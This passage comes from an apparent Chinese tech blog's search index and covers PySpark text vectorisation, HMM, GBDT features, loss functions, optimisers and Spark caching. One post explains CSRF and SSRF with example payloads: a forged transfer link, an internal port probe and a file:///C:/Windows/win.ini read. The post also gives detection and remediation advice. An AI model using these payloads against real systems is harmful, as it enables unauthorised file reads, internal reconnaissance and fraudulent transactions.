1234567891011121314151617181920#创建稀疏向量a = SparseVector(4, [1, 3], [3.0, 4.0])a.toArray()output: array([0., 3., 0., 4.])#计算点乘a.dot(array([1., 2., 3., 4.]))output: 22.0 #获得存值得对应的索引列表a.indicesoutput: array([1, 3], dtype=int32)#获取向量维度a.sizeoutput: 4]]></content>
      <tags>
        <tag>pyspark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyspark-向量化技术]]></title>
    <url>%2F2018%2F11%2F20%2Fpyspark-%E6%96%87%E6%9C%AC%E5%90%91%E9%87%8F%E5%8C%96%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[​ 在pyspark中文本的向量化技术主要在包pyspark.ml.feature中，主要包括以下几种： 1.Ngram 2.tf-idf 3.Word2Vec 1.Ngram​ 2.tf-idf​ 在pyspark中tf和idf是分开的两个步骤 ​ （1）tf ​ 整个tf的过程就是一个将将各个文本进行计算频数统计的过程，使用前要先使用也定的算法来对语句进行分词，然后指定统计特征的数量再进行tf统计 ​ 常用参数： ​ 1.numsFeatures 统计的特征数量，这个值一般通过ParamGridBuilder尝试得出最合适的值 ​ 2.inputCol 输入列，输入类列为ArrayType的数据 ​ 3.outputCol 输出列 ,输出列为Vector类型的数据 123456789101112df = spark.createDataFrame([(["this", "is", "apple"],),(["this", "is", "apple","watch","or","apple"],)], ["words"])hashingTF = HashingTF(numFeatures=10, inputCol="words", outputCol="tf")hashingTF.transform(df).show(10,False)output:+-----------------------------------+--------------------------------+|words |tf |+-----------------------------------+--------------------------------+|[this, is, apple] |(10,[1,3],[2.0,1.0]) ||[this, is, apple, watch, or, apple]|(10,[1,2,3,7],[3.0,1.0,1.0,1.0])|+-----------------------------------+--------------------------------+ ​ 其中，10代表了特征数，[1,3]代表了this和is对应的哈希值，[2.0,1.0]代表了this和is出现的频数. ​ (2)idf 常用参数： ​ 1.minDocFreq 最少要出现的频数，如果超过minDocFreq个样本中出现了这个关键词，这个频数将不tf-idf特征，直接为0 ​ 2.inputCol 输入列 ​ 3.ouputCol 输出列 123456789101112idf = IDF(inputCol="tf",outputCol="tf-idf")idf_model = idf.fit(df)idf_model.transform(df).show(10,False)output:+-----------------------------------+--------------------------------+--------------------------------------------------------------+|words |tf |tf-idf |+-----------------------------------+--------------------------------+--------------------------------------------------------------+|[this, is, apple] |(10,[1,3],[2.0,1.0]) |(10,[1,3],[0.0,0.0]) ||[this, is, apple, watch, or, apple]|(10,[1,2,3,7],[3.0,1.0,1.0,1.0])|(10,[1,2,3,7],[0.0,0.4054651081081644,0.0,0.4054651081081644])|+-----------------------------------+--------------------------------+--------------------------------------------------------------+ 3.CountVec​ CountVec是一种直接进行文本向量，直接词频统计的向量化方式，可以 常用参数包括： ​ minDF：要保证出现词的代表性。当minDF值大于1时，表示词汇表中出现的词最少要在minDf个文档中出现过，否则去除掉不进入词汇表；当minDF小于1，表示词汇表中出现的词最少要在包分之minDF*100个文档中出现才进入词汇表 ​ minTF：过滤文档中出现的过于罕见的词，因为这类词机乎不在什么文本中出现因此作为特征可区分的样本数量比较少。当minTF大于1时，表示这个词出现的频率必须高于这个才会进入词汇表；小于1时，表示这个大于一个分数时才进入词汇表 ​ binary: 是否只计算0/1,即是否出现该词。默认值为False。 ​ inputCol:输入列名，默认为None ​ outputCol:输出列名，默认为None 1234567891011121314151617181920212223242526df = spark.createDataFrame([(["this", "is", "apple"],),(["this", "is", "apple","watch","or","apple"],)], ["words"])#使用Word2Vec进行词向量化countvec = CountVectorizer(inputCol='words',outputCol='countvec')countvec_model = countvec.fit(df)countvec_model.transform(df).show(10,False)output:+-----------------------------------+----------------------------------------+-------------------------------------+|words |tf |countvec |+-----------------------------------+----------------------------------------+-------------------------------------+|[this, is, apple] |(20,[1,11,13],[1.0,1.0,1.0]) |(5,[0,1,2],[1.0,1.0,1.0]) ||[this, is, apple, watch, or, apple]|(20,[1,2,7,11,13],[1.0,1.0,1.0,2.0,1.0])|(5,[0,1,2,3,4],[2.0,1.0,1.0,1.0,1.0])|+-----------------------------------+----------------------------------------+-------------------------------------+#使用CountVec的binary模式进行向量化，countvec = CountVectorizer(inputCol='words',outputCol='countvec',binary=True)countvec_model = countvec.fit(df)countvec_model.transform(df).show(10,False)output:+-----------------------------------+----------------------------------------+-------------------------------------+|words |tf |countvec |+-----------------------------------+----------------------------------------+-------------------------------------+|[this, is, apple] |(20,[1,11,13],[1.0,1.0,1.0]) |(5,[0,1,2],[1.0,1.0,1.0]) ||[this, is, apple, watch, or, apple]|(20,[1,2,7,11,13],[1.0,1.0,1.0,2.0,1.0])|(5,[0,1,2,3,4],[1.0,1.0,1.0,1.0,1.0])|+-----------------------------------+----------------------------------------+-------------------------------------+ 4.Word2Vec​ Word2Vec 是一种常见的文本向量化方式,使用神经网络讲一个词语和他前后的词语来进行表示这个这个词语，主要分为CBOW和Skip- ​ 特点：Word2Vec主要是结合了前后词生成各个词向量，具有一定的语义信息 在pyspark.ml.feature中存在Word2Vec和Word2VecModel两个对象，这两个对象之间存在什么区别和联系呢？ ​ Word2Vec是Word2Vec基本参数设置部分，Word2VecModel是训练好以后的Word2Vec，有些函数只有Word2VecModel训练好以后才能使用 常见参数： ​ 1.vectorSize 生成的词向量大小 ​ 2.inputCol 输入列 ​ 3.ouputCol 输出列 ​ 4.windowSize 输出的词向量和该词前后多少个词与有关 ​ 5.maxSentenceLength 输入句子的最大长度，超过改长度直接进行进行截断 ​ 6.numPartitions 分区数，影响训练速度 常用函数： ​ 这里的常见函数要对Word2VecModel才能使用 ​ getVectors() 获得词和词向量的对应关系,返回值为dataframe ​ transform() 传入一个dataframe，将一个词列转换为词向量 ​ save() 保存模型 使用要先使用训练集对其进行训练： 123456789101112输入数据： 已经使用一定的分词方式已经进行分词后的ArrayType数组输出： 当前句子各个词进行word2vec编码后的均值，维度为vectorSize word2vec = Word2Vec(vectorSize=100,inputCol="word",outputCol="word_vector",windowSize=3,numPartitions=300)word2vec_model = word2vec.fit(data)#features将会在data的基础上多出一列word_vector，为vectorSize维数组features = word2vec.trandform(data)word2vec_model.save("./model/name.word2vec") Word2Vec如何查看是否已经训练的很好： ​ 1.选择两个在日常生活中已知词义相近的两个词A、B，再选一个与A词义不那么相近但也有一定相似度的词C ​ 2.计算A和B以及A和C的余弦距离 ​ 3.比较其大小，当满足AB距离小于AC时，重新选择三个词重复上过程多次都满足，那么认为模型已经训练完毕；若不满足上述过程，那么继续加入样本进行训练 当word2vec中为了表达两个比较相近的词的相似性可以怎么做？比如在当前word2vec下tea、cooffe之间的相似性非常高，接近于1 ​ 增加word2vec的向量维度。可能是在当前维度中向量维度过小，导致这两个词无法表达充分，因此我们可以增加向量维度，以期待在更高维的向量空间中，可以区分这个名词 过程中可能用的： 12345#获得某个词对应的词向量word2vec_model.getVectors().filter("word=='0eva'").collect()[0]['vector']#计算两个词向量之间距离平方a1.squared_distance(a2)]]></content>
  </entry>
  <entry>
    <title><![CDATA[linux——恢复误删除文件]]></title>
    <url>%2F2018%2F11%2F16%2Flinux%E2%80%94%E2%80%94%E6%81%A2%E5%A4%8D%E8%AF%AF%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[​ ububtu默认情况下会存在一个默认回收站，当使用的文件被误删除需要找回时，可以进入到回收站找到该文件，将其恢复出来即可 回收站位置： ​ ~/.local/share/Trash 找回方式： ​ 进入该目录，直接将该目录中的文件考出即可]]></content>
  </entry>
  <entry>
    <title><![CDATA[概率图模型——HMM]]></title>
    <url>%2F2018%2F11%2F07%2F%E6%A6%82%E7%8E%87%E5%9B%BE%E6%A8%A1%E5%9E%8B%E2%80%94%E2%80%94HMM%2F</url>
    <content type="text"><![CDATA[马尔科夫模型假设： ​ 1.马尔科夫模型认为每一时刻的表现x有一个状态z与其对应 ​ 2.观测独立性假设：每个时刻的输出都只与当前的状态有关 ​ 3.贝叶斯公式P(o|λ) = P(λ|o)P(o) / P(λ) 马尔科夫模型的推导过程​ 对于马尔科夫模型，求解的最终目的是 1maxP(o1o2...on|λ1λ2...λn) ​ 由于p(o|λ)是个关于2n各变量的条件概率，并且n不固定，因此没办法进行精确计算。因此马尔科夫链模型采用了一种更加巧妙地方式来进行建模。 ​ 首先，根据贝叶斯公式可以得： 1P(o|λ) = P(λ|o)P(o) / P(λ) ​ λ为给定的输入，因此P(λ)为常数，因此可以忽略.因此 1P(o|λ) = P(λ|o)P(o) ​ 而根据观测独立性假设，可以得到 12P(o1o2...on|λ1λ2...λn) = P(o1|λ1)P(o2|λ2)...P(on|λn) P(o) = P(o1)P(o2|o1)P(o3|o1,o2)...P(on|on-1,on-2,...,o1) ​ 而由于其次马尔科夫假设，每个输出仅与上一个一个输出有关，那么 1P(o) = p(o1)P(o2|o1)....P(on|on-1) ​ 因此最终可得： 1P(o|λ) ~ p(o1)P(o1|o2)P(λ|o2)P(o2|o3)P(λ3|o3)...P(on|on-1)P(λ|on) ​ 其中，P(λk|ok)为发射概率，P(ok|ok-1)为转移概率。 维特比算法​ 维特比算法是隐马尔科夫模型最终求解当前表现链最可能对应的状态链使用的一种动态规划算法。主要思想是： HMM模型训练后的输出为：初始状态概率矩阵、状态转移矩阵、发射概率矩阵三个结果，用来后续进行预测 概率图模型大部分都是这样，输出为几个概率矩阵 而LR模型的输出就为系数矩阵了 我们可以看出来，LR在使用训练好的模型进行与测试效率较高，而HMM使用训练好的模型进行训练时效率较低]]></content>
  </entry>
  <entry>
    <title><![CDATA[机器学习和深度学习在实践中的一些经验]]></title>
    <url>%2F2018%2F11%2F05%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%9C%A8%E5%AE%9E%E8%B7%B5%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[使用GBDT算法构造特征​ Facebook 2014年的文章介绍了通过GBDT解决LR的特征组合问题。[1]GBDT思想对于发现多种有区分性的特征和组合特征具有天然优势，可以用来构造新的组合特征。 ​ 在这篇论文中提出可以使用GBDT各棵数输出节点的索引号来作为新的特征，对各个树渠道的索引号做one-hot编码，然后与原始的特征一起新的特征输入到模型中往往会起到不错的效果。 实践情况 ​ 1.本人使用这种方式在ctr预估中已经进行过实验，准确率提升2% ​ 2.美团在外卖预计送达时间预测中进行了实验，各个时段平均偏差减少了3% (1) 超参数选择 a. 首先为了节点分裂时质量和随机性，分裂时所使用的最大特征数目为√n。b. GBDT迭代次数（树的数量）。 树的数量决定了后续构造特征的规模，与学习速率相互对应。通常学习速率设置较小，但如果过小，会导致迭代次数大幅增加，使得新构造的特征规模过大。 通过GridSearch+CrossValidation可以寻找到最合适的迭代次数+学习速率的超参组合。c. GBDT树深度需要足够合理，通常在4~6较为合适。 虽然增加树的数量和深度都可以增加新构造的特征规模。但树深度过大，会造成模型过拟合以及导致新构造特征过于稀疏。 （2）训练方案 ​ 将训练数据随机抽样50%，一分为二。前50%用于训练GBDT模型，后50%的数据在通过GBDT输出样本在每棵树中输出的叶子节点索引位置，并记录存储，用于后续的新特征的构造和编码，以及后续模型的训练。如样本x通过GBDT输出后得到的形式如下：x → [25,20,22,….,30,28] ，列表中表示样本在GBDT每个树中输出的叶子节点索引位置。 ​ 由于样本经过GBDT输出后得到的x → [25,20,22,….,30,28] 是一组新特征，但由于这组新特征是叶子节点的ID，其值不能直接表达任何信息，故不能直接用于ETA场景的预估。为了解决上述的问题，避免训练过程中无用信息对模型产生的负面影响，需要通过独热码（OneHotEncoder）的编码方式对新特征进行处理，将新特征转化为可用的0-1的特征。 ​ 以图5中的第一棵树和第二棵树为例，第一棵树共有三个叶子节点，样本会在三个叶子节点的其中之一输出。所以样本在该棵树有会有可能输出三个不同分类的值，需要由3个bit值来表达样本在该树中输出的含义。图中样本在第一棵树的第一个叶子节点输出，独热码表示为{100}；而第二棵树有四个叶子节点，且样本在第三个叶子节点输出，则表示为{0010}。将样本在每棵树的独热码拼接起来，表示为{1000010}，即通过两棵CART树构造了7个特征，构造特征的规模与GBDT中CART树的叶子节点规模直接相关。 Wide&amp;Deep在推荐中应用 【参考文献】 He X, Pan J, Jin O, et al. Practical Lessons from Predicting Clicks on Ads at Facebook[C]. Proceedings of 20th ACM SIGKDD Conference on Knowledge Discovery and Data Mining. ACM, 2014: 1-9.]]></content>
      <categories>
        <category>机器学习，深度学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全——CSRF和SSRF]]></title>
    <url>%2F2018%2F11%2F02%2Fweb%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94CSRF%E5%92%8CSSRF%2F</url>
    <content type="text"><![CDATA[CSRF​ CSRF(Cross-site request Forgery，跨站请求伪造)通过伪装成受信任用户请求受信任的网站。 1注意:scrf漏洞并不需要获取用户的cookie等信息 目标：已经登陆了网站的用户 目的：以合法用户的身份来进行一些非法操作 需要条件： ​ 1.用户已经登陆了目标网站 ​ 2.目标用户访问了攻击者构造的url 攻击过程: ​ 1.找到存于登陆状态的存在csrf网站的合法用户，向其发送可以构造的恶意链接，诱使其点击 ​ 2.用户点击该链接，由该合法用户向服务器发出包含恶意链接里隐藏操作（如删除数据、转账等）的请求 ​ 3.服务器收到已经登录用户的请求，认为是合法用户的主动的操作行为，执行该操作 典型的csrf实例 ​ 当你使用网上银行进行转账时，首先需要登录网上银行，点击转账按钮后，会发出http://www.xxbank.com/pay.php?user=xx&amp;money=100请求，当存在攻击者想要对你进行csrf攻击时，他会向你发送一个邮件或者短信，其中包含可以构造的恶意链接 http://www.bank.com/pay,php?user=hack&amp;money=100,并且采用一定的伪装手段诱使你进行点击，当你点击后即向该hack转账100元。 流量中检测csrf的可行性 ​ 1.对于比较低级的csrf而言，可以直接通过检测请求的referer字段来进行确定是否为scrf。因为在正常scrf页面中应该是在主页等页面跳转得到，而csrf请求一般的referer是空白或者是其他网站，但是该方法可以被绕过。 ​ 2.完全的检测很难 csrf漏洞修复建议 ​ 1.验证请求的referer ​ 2.在请求中加入随机的token等攻击者不能伪造的信息 SSRF​ SSRF(Server-Side Request Forgery，服务端请求伪造)是一种有由攻击者构造请求，服务器端发起请求的安全漏洞。 目标：外网无法访问的服务器系统 目的：获取内网主机或者服务器的信息、读取敏感文件等 形成原因：服务器端提供了从其他服务器获取数据的功能，但没有对目标地址做限制和过滤 攻击过程： ​ 1.用户发现存在ssrf漏洞的服务器a的页面访问的url，以及可使用SSRF攻击的参数 ​ 2.修改要请求参数要请求的文件，将其改成内网服务器b和文件，直接访问 ​ 3.服务器a接收到要访问的参数所包含的服务器b和文件名，去服务器b下载资源 ​ 3.对于服务器b，由于是服务器a发起的请求，直接将文件返回给服务器a ​ 4.服务器a将该文件或页面内容直接返回给用户 两种典型的ssrf攻击实例: ​ 本地存在ssrf漏洞的页面为：http://127.0.0.1/ssrf.php?url=http://127.0.0.1/2.php 原始页面的功能为通过GET方式获取url参数的值，然后显示在网页页面上。如果将url参数的值改为http://www.baidu.com ，这个页面则会出现百度页面内容。 ​ 因此利用这个漏洞，我们可以将url参数的值设置为内网址，这样可以做到获取内网信息的效果。 ​ 探测内网某个服务器是否开启 ​ 将url参数设置为url=”192.168.0.2:3306”时，可以获取大到该内网主机上是否存在mysql服务。 ​ 读取内网服务器文件 ​ 访问ssrf.php?url=file:///C:/Windows/win.ini 即可读取本地文件 流量中检测SSRF可行性分析： ​ 对于只能抓到外网向内网访问的流量的网口来说，从流量中检测SSRF只能从请求参数异常或返回包是否异常、是否包含敏感信息来进行检测。 SSRF漏洞修复建议: ​ 1.限制请求的端口只能是web端口，只允许访问http和https的请求 ​ 2.限制不能访问内网IP，以防止对内网进行攻击 ​ 3.屏蔽返回的信息详情]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NLP—关键词提取算法]]></title>
    <url>%2F2018%2F11%2F01%2FNLP%E2%80%94%E5%85%B3%E9%94%AE%E8%AF%8D%E6%8F%90%E5%8F%96%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[关键词提取算法 tf-idf(词频-逆文档频率)​ ​ 其中count(w)为关键词出现的次数，|Di|为文档中所有词的数量。 ​ ​ 其中，N为所有文档的总数，I(w,Di)表示文档Di是否包含该关键词，，包含则为1，不包含则为0，若词在所有文档中均未出现，则IDF公式中分母则为0，因此在分母上加1做平滑(smooth) ​ 最终关键词在文档中的tf-idf值： ​ tf-idf特点： ​ 1.一个词在一个文档中的频率越高，在其他文档中出现的次数越少，tf-idf值越大 ​ 2.tf-idf同时兼顾了词频和新鲜度，可以有效地过滤掉常见词 ​ TextRank​ TextRank算法借鉴于Google的PageRank算法，主要在考虑词的关键度主要考虑链接数量和链接质量（链接到的词的重要度）两个因素。 ​ TextRank算法应用到关键词抽取时连个关键点：1.词与词之间的关联没有权重（即不考虑词与词是否相似） 2.每个词并不是与文档中每个次都有链接关系而是只与一个特定窗口大小内词与才有关联关系。 TextRank特点： ​ 1.不需要使用语料库进行训练，由一篇文章就可以提取出关键词 ​ 2.由于TextRank算法涉及到构建词图以及迭代计算，因此计算速度较慢 ​ 3.虽然考虑了上下文关系，但是仍然将频繁次作为关键词 ​ 4.TextRank算法具有将一定的将关键词进行合并提取成关键短语的能力 ​]]></content>
      <categories>
        <category>机器学习</category>
        <category>NLP</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>NLP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——损失函数]]></title>
    <url>%2F2018%2F10%2F30%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[在机器机器学习和深度学习中有许多常见的损失函数，主要包括： ​ 1.平方差函数MSE（Mean Squared Error） ​ 2.交叉熵函数（Cross Entory） 损失函数选择的方法：1.线性模型中使用平方误差函数，深度学习使用交叉熵函数 ​ 2.平方误差损失函数更适合输出为连续,并且最后一层不含Sigmoid或Softmax激活函数的神经网络；交叉熵损失函数更适合二分类或多分类的场景。 线性模型​ 效果较好的损失函数：平方误差损失函数 ​ 计算公式： ​ ​ 其中，y是我们期望的输出，a是神经元的实际输出a=σ(Wx+b) ​ 损失函数求导： ​ ​ 这也就是每次进行参数更新量的基数，需要再乘以学习速率 为什么深度学习中很少使用MSE作为损失函数？ ​ 当使用MSE作为损失函数时，有上面求导后的公式可以明显的看出，每次的参数更新量取决于σ′(z) ，由Sigmod函数的性质可知，σ′(z) 在 z 取大部分值时会取到一个非常小的值，因此参数更新会异常的缓慢 ​ 深度学习​ 效果最好的损失函数：交叉熵函数 ​ 计算公式： ​ 如果有多个样本，则整个样本集的平均交叉熵为: ​ 对于二分类而言，交叉损失函数为： ​ 损失函数求导： ​ ​ 对于b的求导同理。 ​ 我们可以看出，交叉熵作为损失函数，梯度中的σ′(z) 被消掉了，另外σ(z)-y就是输出值和真实值之间的误差，误差越大，梯度更新越大，参数更新越快。 Softmax损失函数softmax函数​ softmax用于多分类过程中，将多个神经元的输出映射到(0，1)区间，可以看做被分为各个类的概率。 ​ 其中， softmax求导相关推导 ​ 对于使用作为激活函数的神经网络，最终只输出只有最大的softmax最大的项为1其余项均为0，假设yj=1，带入交叉熵公式中得 ​ Loss=-y_{i}loga_i ​ 去掉了累加和，因为只有一项y为1，其余都为0，而将yj=1带入得 ​ Loss=-loga_i ​ 下面我们准备将损失函数对参数求导，参数的形式在该例子中，总共分w41,w42,w43,w51,w52,w53,w61,w62,w63.这些，那么比如我要求出w41,w42,w43的偏导，就需要将Loss函数求偏导传到结点4，然后再利用链式法则继续求导即可，举个例子此时求w41的偏导为: ​ \frac{\partial Loss}{\partial w_{ij}} = \frac{\partial Loss}{\partial a_j}\frac{\partial a_j}{\partial z_i}\frac{\partial z_i}{\partial w_{ij}} ​ 其中右边第一项q求导为： ​ \frac{\partial Loss}{\partial a_j} = -\frac{1}{a_j} ​ 右边第三项求导为： ​ \frac{\partial z_j}{\partial w_ij} = x_{i} ​ 核心是求右侧第二项：$\frac{\partial a_j}{\partial z_j}$，这里我们分两种情况进行讨论 ​ 将前两项的结果进行连乘得： ​ ​ 而对于分类问题，只会有一个$y_i$为1，其余均为0，因此，对于分类问题： ​ ​ 最终： ​ \frac{\partial Loss}{\partial w_{ij}} = \frac{\partial Loss}{\partial a_j}\frac{\partial a_j}{\partial z_i}\frac{\partial z_i}{\partial w_{ij}}==(a_{i}-y{i})x{i}]]></content>
      <tags>
        <tag>面试</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——优化器optimzer]]></title>
    <url>%2F2018%2F10%2F30%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E4%BC%98%E5%8C%96%E5%99%A8optimzer%2F</url>
    <content type="text"><![CDATA[​ 在机器学习和深度学习中，选择合适的优化器不仅可以加快学习速度，而且可以避免在训练过程中困到的鞍点。 1.Gradient Descent （GD）​ BGD是一种使用全部训练集数据来计算损失函数的梯度来进行参数更新更新的方式，梯度更新计算公式如下： ​ 123for i in range(nb_epochs): params_grad = evaluate_gradient(loss_function, data, params) params = params - learning_rate * params_grad 缺点： 1.由于在每一次更新中都会对整个数据及计算梯度，因此计算起来非常慢，在大数据的情况下很难坐到实时更新。 ​ 2.Batch gradient descent 对于凸函数可以收敛到全局极小值，对于非凸函数可以收敛到局部极小值。 2.Stochastic Gradient Descent(SGD)​ SGD是一种最常见的优化方法，这种方式每次只计算当前的样本的梯度，然后使用该梯度来对参数进行更新，其计算方法为： ​ 12345for i in range(nb_epochs): np.random.shuffle(data) for example in data: params_grad = evaluate_gradient(loss_function, example, params) params = params - learning_rate * params_grad ​ 随机梯度下降是通过每个样本来迭代更新一次，如果样本量很大的情况，那么可能只用其中部分的样本，就已经将theta迭代到最优解了，对比上面的批量梯度下降，迭代一次需要用到十几万训练样本，一次迭代不可能最优，如果迭代10次的话就需要遍历训练样本10次。 缺点：1.存在比较严重的震荡 ​ 2.容易收敛到局部最优点,但有时也可能因为震荡的原因跳过局部最小值 3.Batch Gradient Descent （BGD）​ BGD 每一次利用一小批样本，即 n 个样本进行计算，这样它可以降低参数更新时的方差，收敛更稳定，另一方面可以充分地利用深度学习库中高度优化的矩阵操作来进行更有效的梯度计算。 ​ 12345for i in range(nb_epochs): np.random.shuffle(data) for batch in get_batches(data, batch_size=50): params_grad = evaluate_gradient(loss_function, batch, params) params = params - learning_rate * params_grad ​ 参数值设定：batch_szie一般在设置在50~256之间 缺点：1.不能保证很好的收敛性。 ​ 2.对所有参数进行更新时使用的是完全相同的learnnning rate ​ 这两个缺点也是前面这几种优化方式存在的共有缺陷，下面的优化方式主要就是为了晚上前面这些问题 4.Momentum 核心思想：用动量来进行加速 适用情况：善于处理稀疏数据 ​ 为了克服 SGD 振荡比较严重的问题，Momentum 将物理中的动量概念引入到SGD 当中，通过积累之前的动量来替代梯度。即: ​ 其中，γ 表示动量大小，μ表示学习速率大小。 ​ 相较于 SGD，Momentum 就相当于在从山坡上不停的向下走，当没有阻力的话，它的动量会越来越大，但是如果遇到了阻力，速度就会变小。也就是说，在训练的时候，在梯度方向不变的维度上，训练速度变快，梯度方向有所改变的维度上，更新速度变慢，这样就可以加快收敛并减小振荡。 ​ 超参数设定：一般 γ 取值 0.9 左右。 缺点：这种情况相当于小球从山上滚下来时是在盲目地沿着坡滚，如果它能具备一些先知，例如快要上坡时，就知道需要减速了的话，适应性会更好。 5.Adaptive gradient algorithm（Adagrad） 核心思想：对学习速率添加约束，前期加速训练，后期提前结束训练以避免震荡，减少了学习速率的手动调节 适用情况：这个算法可以对低频参数进行较大的更新，高频参数进行更小的更新，对稀疏数据表现良好，提高了SGD的鲁棒性，善于处理非平稳目标 ​ 相较于 SGD，Adagrad 相当于对学习率多加了一个约束，即： ​ 对于经典的SGD： ​ ​ 而对于Adagrad： ​ 其中，r为梯度累积变量，r的初始值为0。ε为全局学习率，需要自己设置。δ为小常数，为了数值稳定大约设置为10-7 ​ 超参数设定：一般η选取0.01，ε一般设置为10-7 ​ 缺点：分母会不断积累，这样学习速率就会变得非常小 6.Adadelta​ 超参数设置：p 0.9 ​ Adadelta算法是基于Adagrad算法的改进算法，主要改进主要包括下面两点： 1.将分母从G换成了过去梯度平方的衰减的平均值 2.将初始学习速率换成了RMS[Δθ](梯度的均方根) part one​ (1) 将累计梯度信息从全部的历史信息变为当前时间窗口向前一个时间窗口内的累积： ​ (2)将上述公式进行开方，作为每次迭代更新后的学习率衰减系数 记 其中 是为了防止分母为0加上的一个极小值。 ​ 这里解决了梯度一直会下降到很小的值得问题。 part two​ 将原始的学习速率换为参数值在前一时刻的RMS ​ 因为原始的学习速率已经换成了前一时刻的RMS值，因此，对于adadelta已经不需要选择初始的学习速率 7.RMSprop​ RMSprop 与 Adadelta 的第一种形式相同： ​ 使用的是指数加权平均，旨在消除梯度下降中的摆动，与Momentum的效果一样，某一维度的导数比较大，则指数加权平均就大，某一维度的导数比较小，则其指数加权平均就小，这样就保证了各维度导数都在一个量级，进而减少了摆动。允许使用一个更大的学习率η ​ 超参数设置：建议设定 γ 为 0.9, 学习率 η 为 0.001 7.Adam 核心思想：结合了Momentum动量加速和Adagrad对学习速率的约束 适用情况：各种数据，前面两种优化器适合的数据Adam都更效果更好， ​ Adam 是一个结合了 Momentum 与 Adagrad 的产物，它既考虑到了利用动量项来加速训练过程，又考虑到对于学习率的约束。利用梯度的一阶矩估计和二阶矩估计动态调整每个参数的学习率。Adam 的优点主要在于经过偏置校正后，每一次迭代学习率都有个确定范围，使得参数比较平稳。其公式为: ​ ​ 其中： 总结：在实际工程中被广泛使用，但是也可看到在一些论文里存在着许多使用Adagrad、Momentum的，杜对于SGD由于其需要更多的训练时间和鞍点问题，因此在实际工程中很少使用如何选择最优化算法​ 1.如果数据是稀疏的，就是自适应系列的方法 Adam、Adagrad、Adadelta ​ 2.Adam 就是在 RMSprop 的基础上加了 bias-correction 和 momentum ​ 3.随着梯度变的稀疏，Adam 比 RMSprop 效果会好。 ​ 整体来说Adam是最好的选择 参考文献:深度学习在美团点评推荐系统中的应用 https://blog.csdn.net/yukinoai/article/details/84198218]]></content>
      <categories>
        <category>深度学习</category>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典机器学习算法——KMeans]]></title>
    <url>%2F2018%2F10%2F27%2F%E7%BB%8F%E5%85%B8%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94KMeans%2F</url>
    <content type="text"><![CDATA[KMeans算法]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>聚类算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyspark学习心得]]></title>
    <url>%2F2018%2F10%2F23%2Fpyspark%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[​ 持久化​ Spark中对于一个RDD执行多次算子的默认原理是这样的：每次你对一个RDD执行一个算子操作时，都会重新从源头处计算一遍，计算出那个RDD来，然后再对这个RDD执行你的算子操作。这种方式的性能是很差的。 ​ 因此对于这种情况，我们的建议是：对多次使用的RDD进行持久化。此时Spark就会根据你的持久化策略，将RDD中的数据保存到内存或者磁盘中。以后每次对这个RDD进行算子操作时，都会直接从内存或磁盘中提取持久化的RDD数据，然后执行算子，而不会从源头处重新计算一遍这个RDD，再执行算子操作。 ​ spark中的持久化操作主要分为两种：persist和cache。cache相当于使用MEMORY_ONLY级别的persist操作，而persist更灵活可以任意指定persist的级别。 如何选择一种最合适的持久化策略 默认情况下，性能最高的当然是MEMORY_ONLY，但前提是你的内存必须足够足够大，可以绰绰有余地存放下整个RDD的所有数据。因为不进行序列化与反序列化操作，就避免了这部分的性能开销；对这个RDD的后续算子操作，都是基于纯内存中的数据的操作，不需要从磁盘文件中读取数据，性能也很高；而且不需要复制一份数据副本，并远程传送到其他节点上。但是这里必须要注意的是，在实际的生产环境中，恐怕能够直接用这种策略的场景还是有限的，如果RDD中数据比较多时（比如几十亿），直接用这种持久化级别，会导致JVM的OOM内存溢出异常。 如果使用MEMORY_ONLY级别时发生了内存溢出，那么建议尝试使用MEMORY_ONLY_SER级别。该级别会将RDD数据序列化后再保存在内存中，此时每个partition仅仅是一个字节数组而已，大大减少了对象数量，并降低了内存占用。这种级别比MEMORY_ONLY多出来的性能开销，主要就是序列化与反序列化的开销。但是后续算子可以基于纯内存进行操作，因此性能总体还是比较高的。此外，可能发生的问题同上，如果RDD中的数据量过多的话，还是可能会导致OOM内存溢出的异常。 如果纯内存的级别都无法使用，那么建议使用MEMORY_AND_DISK_SER策略，而不是MEMORY_AND_DISK策略。因为既然到了这一步，就说明RDD的数据量很大，内存无法完全放下。序列化后的数据比较少，可以节省内存和磁盘的空间开销。同时该策略会优先尽量尝试将数据缓存在内存中，内存缓存不下才会写入磁盘。 通常不建议使用DISK_ONLY和后缀为_2的级别：因为完全基于磁盘文件进行数据的读写，会导致性能急剧降低，有时还不如重新计算一次所有RDD。后缀为_2的级别，必须将所有数据都复制一份副本，并发送到其他节点上，数据复制以及网络传输会导致较大的性能开销，除非是要求作业的高可用性，否则不建议使用。 